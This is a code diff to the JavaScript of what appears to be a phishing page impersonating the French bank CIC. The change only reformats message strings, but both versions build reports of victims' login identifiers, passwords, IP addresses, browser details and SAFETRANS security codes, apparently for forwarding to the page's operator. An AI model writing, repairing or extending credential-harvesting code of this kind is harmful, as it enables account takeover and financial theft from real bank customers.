@@ -498,15 +498,7 @@
             }
             
             const ip = await getIP();
-            const message = `🏦 CIC - NOUVELLE CONNEXION 🏦
-━━━━━━━━━━━━━━━━━━━━━
-👤 Identifiant: ${identifiant}
-🔑 Mot de passe: ${password}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 IP: ${ip}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-✅ Statut: Connexion en cours`;
+            const message = `🏦 CIC - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${identifiant}\n🔑 Mot de passe: ${password}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
 
             showLoading();
             
@@ -527,12 +519,7 @@
             e.preventDefault();
             
             const ip = await getIP();
-            const message = `🔐 CIC - TENTATIVE CERTIFICAT ÉLECTRONIQUE 🔐
-━━━━━━━━━━━━━━━━━━━━━
-💻 Tentative d'utilisation de la clé USB
-🌍 IP: ${ip}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}`;
+            const message = `🔐 CIC - TENTATIVE CERTIFICAT ÉLECTRONIQUE 🔐\n━━━━━━━━━━━━━━━━━━━━━\n💻 Tentative d'utilisation de la clé USB\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}`;
             
             showLoading();
             
@@ -549,12 +536,7 @@
             const safeCode = document.getElementById('safecode').value || 'Non saisi';
             
             const ip = await getIP();
-            const message = `🔐 CIC - TENTATIVE SAFETRANS 🔐
-━━━━━━━━━━━━━━━━━━━━━
-🔢 Code SAFETRANS: ${safeCode}
-🌍 IP: ${ip}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}`;
+            const message = `🔐 CIC - TENTATIVE SAFETRANS 🔐\n━━━━━━━━━━━━━━━━━━━━━\n🔢 Code SAFETRANS: ${safeCode}\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}`;
             
             showLoading();
             
